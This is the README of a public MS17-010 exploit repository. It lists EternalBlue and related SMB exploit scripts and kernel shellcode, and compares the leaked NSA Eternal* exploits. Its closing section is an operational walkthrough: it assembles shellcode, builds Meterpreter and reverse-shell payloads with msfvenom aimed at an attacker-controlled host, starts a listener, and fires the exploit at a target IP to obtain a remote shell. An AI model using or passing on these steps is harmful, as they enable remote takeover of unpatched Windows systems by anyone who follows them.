# MS17-010

This repository is for public my work on MS17-010. I have no plan to do any support. **All support issues will not get response from me**.

## Files

 * **BUG.txt** MS17-010 bug detail and some analysis
 * **checker.py** Script for finding accessible named pipe
 * **eternalblue_exploit7.py** Eternalblue exploit for windows 7/2008
 * **eternalblue_exploit8.py** Eternalblue exploit for windows 8/2012 x64
 * **eternalblue_poc.py** Eternalblue PoC for buffer overflow bug
 * **eternalblue_kshellcode_x64.asm** x64 kernel shellcode for my Eternalblue exploit. This shellcode should work on Windows Vista and later
 * **eternalblue_kshellcode_x86.asm** x86 kernel shellcode for my Eternalblue exploit. This shellcode should work on Windows Vista and later
 * **eternalblue_sc_merge.py** Script for merging eternalblue x86 and x64 shellcode. Eternalblue exploit, that support both x86 and x64, with merged shellcode has no need to detect a target architecture

 * **infoleak_uninit.py** PoC for leaking info from uninitialized transaction data buffer
 * **mysmb.py** Extended Impacket SMB class for easier to exploit MS17-010 bugs
 * **npp_control.py** PoC for controlling nonpaged pool allocation with session setup command
 * **zzz_exploit.py** Exploit for Windows 2000 and later (requires access to named pipe)


## Anonymous user

Anonymous user (null session) get more restriction on default settings of new Windows version. To exploit Windows SMB without authentication, below behavior should be aware.

* Since Windows Vista, default settings does not allow anonymous to access any named pipe
* Since Windows 8, default settings does not allow anonymous to access IPC$ share (IPC$ might be acessible but cannot do much)


## About NSA exploits

* **Eternalblue** requires only access to IPC$ to exploit a target while other exploits require access to named pipe too. So the exploit always works against Windows < 8 in all configuration (if tcp port 445 is accessible). However, Eternalblue has a chance to crash a target higher than other exploits.
* **Eternalchampion** requires access to named pipe. The exploit has no chance to crash a target.
* **Eternalromance** requires access to named pipe. The exploit can target Windows < 8 because the bug for info leak is fixed in Windows 8. The exploit should have a chance to crash a target lower than Eternalblue. I never test a reliable of the exploit.
* **Eternalsynergy** requires access to named pipe. I believe this exploit is modified from Eternalromance to target Windows 8 and later. Eternalsynergy uses another bug for info leak and does some trick to find executable memory (I do not know how it works because I read only output log and pcap file).

## Instructions to perform exploit

**Step 1:** `git clone https://github.com/w0rtw0rt/MS17-010.git && cd MS17-010/`

**Step 1a:** gedit/vi/nano eternalblue_exploit8.py and change lines 52 and 53 to match the account authentication
example:
USERNAME='Guest'
PASSWORD=''

**Step 2:** cd shellcode and type `nasm -f bin eternalblue_kshellcode_x64(x86).asm`

**Step 3:** `msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o meterpreter_(IP)_msf.bin EXITFUNC=thread LHOST=(IP) LPORT=(Port)`

**Step 3a:** `msfvenom -p windows/x64/shell/reverse_tcp -f raw -o shell_(IP)_msf.bin EXITFUNC=thread LHOST=(IP) LPORT=(Port)`

**Step 4:** `cat eternalblue_kshellcode_x64(x86) shell_(IP)_msf.bin (OR meterpreter_(IP)_msf.bin) > (payloadname).bin`

**Step 5:** Set up exploit/multi/handler in a new terminal window with matching payload you created above and run it

**Step 6:** `cd MS17-010`

**Step 7:** `python eternalblue_exploit8.py (target IP) (payloadname).bin (GROOM COUNT)`

**-side note-** Groom count will typically function with a "200" for windows 8/2012r2 but *might* crash the system - use at your own risk

**Step 8:** shell/meterpreter should be returned if "Guest" account is active or entered credentials worked.
